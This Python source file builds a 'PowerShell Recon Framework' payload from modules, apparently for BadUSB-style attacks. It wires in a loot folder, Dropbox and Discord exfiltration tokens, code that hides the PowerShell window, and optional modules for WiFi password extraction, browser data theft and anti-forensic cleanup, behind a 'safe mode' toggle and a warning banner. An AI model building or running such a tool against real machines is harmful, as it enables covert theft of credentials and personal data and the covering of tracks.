from __future__ import annotations

import argparse
import datetime
import os
import re
import sys
import textwrap
from pathlib import Path

ROOT = Path(__file__).parent.resolve()
MODULES_DIR = ROOT / "modules"
SAFE_DIR = MODULES_DIR / "safe"
CONFIG_TEMPLATE = ROOT / "config_template.ps1"
DEFAULT_OUT = ROOT / "generated_main.ps1"
ENV_FILE = ROOT / ".env"

MODULE_TO_MAIN_CALLS = {
    # Safe
    "popup_messages.ps1": [
        "# Show popup messages",
        "Show-PopupMessages -Cycles 3"
    ],
    "system_info.ps1": [
        "# Collect system information",
        "$systemData = Get-SystemInfo",
        "Export-SystemInfoReport -OutputPath \"$LootFolder\\system_info.txt\" -Data $systemData",
        "Write-SafeLog \"System info collected\""
    ],
    "user_info.ps1": [
        "# Collect user reconnaissance data",
        "Export-UserReconReport -OutputPath \"$LootFolder\\user_recon.txt\"",
        "Write-SafeLog \"User recon completed\""
    ],
    
    # Unsafe
    "wifi_info.ps1": [
        "# WiFi extraction (unsafe - requires admin)",
        "# Export-WiFiReport -OutputPath \"$LootFolder\\wifi_info.txt\" -IncludePasswords"
    ],
    "browser_data.ps1": [
        "# Browser data extraction (unsafe)",
        "# Export-BrowserDataReport -OutputPath \"$LootFolder\\browser_data.txt\""
    ],
    "exfiltration.ps1": [
        "# Exfiltration functions defined - not auto-invoked",
        "# Use: Invoke-DataExfiltration -LootFolder $LootFolder -DropboxToken $DropboxToken -DiscordWebhook $DiscordWebhook -CompressFirst -CleanupAfter"
    ],
    "cleanup.ps1": [
        "# Cleanup functions defined (DANGEROUS - not auto-invoked)",
        "# Use: Invoke-ComprehensiveCleanup -IncludeEventLogs -IncludeBrowserCache"
    ],
    "utils.ps1": [
        "# Utility functions loaded"
    ],
    "config.ps1": [
        "# Config loaded"
    ],
}

AUTO_RUN_RE = re.compile(r"(?ms)^\s*if\s*\(\s*\$MyInvocation[^\)]*\)\s*\{.*?\}\s*$")

def load_dotenv_if_available(env_path: Path) -> dict:
    """Load environment variables from .env file"""
    if not env_path.exists():
        return {}
    try:
        import importlib
        dotenv_mod = importlib.import_module("dotenv")
        if hasattr(dotenv_mod, "load_dotenv"):
            dotenv_mod.load_dotenv(dotenv_path=str(env_path))
        if hasattr(dotenv_mod, "dotenv_values"):
            return dict(dotenv_mod.dotenv_values(dotenv_path=str(env_path)))
    except Exception:
        result = {}
        for ln in env_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            ln = ln.strip()
            if not ln or ln.startswith("#"): 
                continue
            if "=" in ln:
                k, v = ln.split("=", 1)
                result[k.strip()] = v.strip().strip('"').strip("'")
        return result
    return {}

def list_modules(safe_mode: bool):
    """List available modules in the selected directory"""
    base = SAFE_DIR if safe_mode else MODULES_DIR
    return sorted([p.name for p in base.glob("*.ps1") if p.is_file()]) if base.exists() else []

def interactive_choose(mods):
    """Interactive module selection"""
    print("\nAvailable modules:")
    for i, m in enumerate(mods, 1):
        print(f"  {i:>2}. {m}")
    sel = input("\nEnter comma-separated numbers (e.g. 1,3) or 'all': ").strip()
    if sel.lower() == "all": 
        return mods
    chosen = []
    for part in sel.split(","):
        part = part.strip()
        if not part: 
            continue
        try:
            idx = int(part) - 1
            if 0 <= idx < len(mods): 
                chosen.append(mods[idx])
        except ValueError:
            if part in mods: 
                chosen.append(part)
    return chosen

def sanitize_module_text(text: str) -> str:
    """Remove auto-run patterns and normalize text"""
    if text.startswith("\ufeff"): 
        text = text.lstrip("\ufeff")
    new_text = AUTO_RUN_RE.sub("", text)
    if not new_text.endswith("\n"): 
        new_text += "\n"
    return new_text

def build_env_injection(dotenv_values: dict, safe_mode: bool) -> str:
    """Build environment variable injection section"""
    lines = []
    lines.append("# --- Environment Configuration ---")
    
    dropbox_val = dotenv_values.get("DROPBOX_TOKEN", "PLACEHOLDER_DROPBOX_TOKEN")
    discord_val = dotenv_values.get("DISCORD_WEBHOOK", "PLACEHOLDER_DISCORD_WEBHOOK")

    lines.append(f"$DropboxToken = \"{dropbox_val}\"")
    lines.append(f"$DiscordWebhook = \"{discord_val}\"")
    lines.append("")
    
    lines.append("# Create loot collection folder")
    lines.append("$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'")
    lines.append("$LootFolder = Join-Path $env:TEMP \"$($env:USERNAME)-LOOT-$timestamp\"")
    lines.append("if (-not (Test-Path $LootFolder)) {")
    lines.append("    New-Item -Path $LootFolder -ItemType Directory -Force | Out-Null")
    lines.append("}")
    lines.append("Write-SafeLog \"Loot folder created: $LootFolder\"")
    lines.append("")
    
    if safe_mode:
        lines.append("# SafeMode stubs for exfiltration functions")
        lines.append("if ($ScriptConfig.SafeMode) {")
        lines.append("    function Send-ToDropbox {")
        lines.append("        param([string]$FilePath, [string]$AccessToken, [string]$DropboxPath)")
        lines.append("        Write-Output \"[SIMULATED] Dropbox upload: $FilePath (SafeMode)\"")
        lines.append("        Write-SafeLog \"SIMULATED: Dropbox upload $FilePath\"")
        lines.append("        return $true")
        lines.append("    }")
        lines.append("    function Send-ToDiscord {")
        lines.append("        param([string]$WebhookUrl, [string]$FilePath, [string]$Message)")
        lines.append("        Write-Output \"[SIMULATED] Discord upload: $FilePath | Msg: $Message (SafeMode)\"")
        lines.append("        Write-SafeLog \"SIMULATED: Discord upload $FilePath\"")
        lines.append("        return $true")
        lines.append("    }")
        lines.append("    function Invoke-ComprehensiveCleanup {")
        lines.append("        param([switch]$IncludeEventLogs, [switch]$IncludeBrowserCache, [switch]$IncludePrefetch, [switch]$Aggressive)")
        lines.append("        Write-Output \"[SIMULATED] Cleanup operations (SafeMode)\"")
        lines.append("        Write-SafeLog \"SIMULATED: Cleanup operations\"")
        lines.append("    }")
        lines.append("}")
    
    lines.append("")
    return "\n".join(lines)

def build_hide_window_code() -> str:
    """Build code to hide PowerShell window"""
    return textwrap.dedent("""\
        # Hide PowerShell window
        $hideCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
        Add-Type -name Win -member $hideCode -namespace Native -ErrorAction SilentlyContinue
        $hwnd = (Get-Process -Id $PID).MainWindowHandle
        [Native.Win]::ShowWindow($hwnd, 0) | Out-Null
        """)

def assemble(selected, out_path: Path, safe_mode: bool, include_config: bool, dotenv_values: dict, hide_window: bool):
    """Assemble the final PowerShell script"""
    pieces = []
    
    header = textwrap.dedent(f"""\
        ############################################################################################
        # PowerShell Recon Framework
        # Generated: {datetime.datetime.utcnow().isoformat()}Z
        # Mode: {'SAFE' if safe_mode else 'UNSAFE'}
        # Modules: {', '.join(selected)}
        ############################################################################################
        
        $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
        Set-Location $ScriptDir
        """)
    pieces.append(header + "\n\n")

    if hide_window:
        pieces.append("# Window hiding\n")
        pieces.append(build_hide_window_code() + "\n\n")

    if include_config and CONFIG_TEMPLATE.exists():
        pieces.append("# --- Configuration (config_template.ps1) ---\n")
        pieces.append(CONFIG_TEMPLATE.read_text(encoding="utf-8") + "\n\n")

    pieces.append(build_env_injection(dotenv_values, safe_mode) + "\n\n")

    base_dir = SAFE_DIR if safe_mode else MODULES_DIR
    for mod in selected:
        mod_path = base_dir / mod
        if not mod_path.exists():
            mod_path = MODULES_DIR / mod
            if not mod_path.exists():
                raise FileNotFoundError(f"Module not found: {mod}")
        
        text = mod_path.read_text(encoding="utf-8", errors="ignore")
        pieces.append(f"# {'='*80}\n")
        pieces.append(f"# MODULE: {mod}\n")
        pieces.append(f"# {'='*80}\n")
        pieces.append(sanitize_module_text(text) + "\n\n")

    pieces.append("# " + "="*80 + "\n")
    pieces.append("# MAIN EXECUTION\n")
    pieces.append("# " + "="*80 + "\n\n")
    
    calls = []
    for mod in selected:
        mapped = MODULE_TO_MAIN_CALLS.get(mod.lower()) or MODULE_TO_MAIN_CALLS.get(mod)
        if mapped:
            calls.extend(mapped)
    
    if not calls:
        calls.append("# No explicit execution calls defined for selected modules.")
        calls.append("Write-SafeLog \"Script execution completed - no auto-calls configured\"")
    
    for call in calls:
        pieces.append(call + "\n")
    
    # Footer
    pieces.append("\n# Execution complete\n")
    pieces.append("Write-SafeLog \"Script execution completed successfully\"\n")
    pieces.append("Write-Output \"\\nCompleted. Check log: $($ScriptConfig.LogPath)\\n\"\n")

    out_path.write_text("".join(pieces), encoding="utf-8")
    print(f"\n Generated: {out_path}")
    print(f"[i] Mode: {'SAFE' if safe_mode else 'UNSAFE'}")
    print(f"[i] Modules: {len(selected)} included")
    print(f"[i] Size: {out_path.stat().st_size:,} bytes\n")
    return True

def main():
    parser = argparse.ArgumentParser(
        description="PowerShell Recon Framework Builder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              # Generate safe demonstration script
              python builder.py --safemode --modules popup_messages.ps1 system_info.ps1
              
              # Generate full recon script (unsafe)
              python builder.py --allow-unsafe --modules system_info.ps1 user_info.ps1 wifi_info.ps1
              
              # Interactive mode with window hiding
              python builder.py --safemode --hide-window
              
              # Dry run to preview
              python builder.py --allow-unsafe --list
            """)
    )
    
    parser.add_argument("--safemode", action="store_true", 
                        help="Use modules/safe/ directory (default)")
    parser.add_argument("--allow-unsafe", action="store_true", 
                        help="Allow selecting modules from modules/ directory")
    parser.add_argument("--modules", nargs="+", 
                        help="Module filenames to include")
    parser.add_argument("--out", default=str(DEFAULT_OUT), 
                        help="Output path for generated script")
    parser.add_argument("--list", action="store_true", 
                        help="List available modules and exit")
    parser.add_argument("--no-config", action="store_true", 
                        help="Do not include config_template.ps1")
    parser.add_argument("--hide-window", action="store_true",
                        help="Include code to hide PowerShell window")
    parser.add_argument("--dryrun", action="store_true", 
                        help="Show what would be done without writing")
    
    args = parser.parse_args()

    safe_mode = True if args.safemode or not args.allow_unsafe else False
    
    if not safe_mode:
        print("\n" + "!"*80)
        print("!  WARNING: UNSAFE MODE ENABLED")
        print("!  This mode includes sensitive modules that can:")
        print("!    - Extract WiFi passwords (requires admin)")
        print("!    - Access browser data")
        print("!    - Exfiltrate data to external services")
        print("!    - Perform anti-forensic cleanup")
        print("!  USE ONLY IN AUTHORIZED, ISOLATED TEST ENVIRONMENTS")
        print("!"*80 + "\n")
        
        confirm = input("Type 'YES' to continue with unsafe mode: ").strip()
        if confirm != "YES":
            print("Aborted.")
            return

    dotenv_values = load_dotenv_if_available(ENV_FILE)
    available = list_modules(safe_mode=safe_mode)

    if args.list:
        mode_str = 'modules/safe' if safe_mode else 'modules'
        print(f"\nAvailable modules (from {mode_str}):\n")
        for m in available:
            print(f"  • {m}")
        print()
        return

    if not available:
        print(f"No modules found in {'modules/safe' if safe_mode else 'modules'}.")
        return

    selected = args.modules or interactive_choose(available)
    if not selected:
        print("No modules selected. Exiting.")
        return
    
    missing = [s for s in selected if s not in available]
    if missing:
        print(f"Error: modules missing: {missing}")
        return

    out_path = Path(args.out)
    
    if args.dryrun:
        print("\n[DRY RUN]")
        print(f"  Mode: {'SAFE' if safe_mode else 'UNSAFE'}")
        print(f"  Modules: {selected}")
        print(f"  Output: {out_path}")
        print(f"  Hide window: {args.hide_window}")
        print(f"  Include config: {not args.no_config}")
        return

    assemble(
        selected,
        out_path,
        safe_mode=safe_mode,
        include_config=not args.no_config,
        dotenv_values=dotenv_values,
        hide_window=args.hide_window
    )

if __name__ == "__main__":
    main()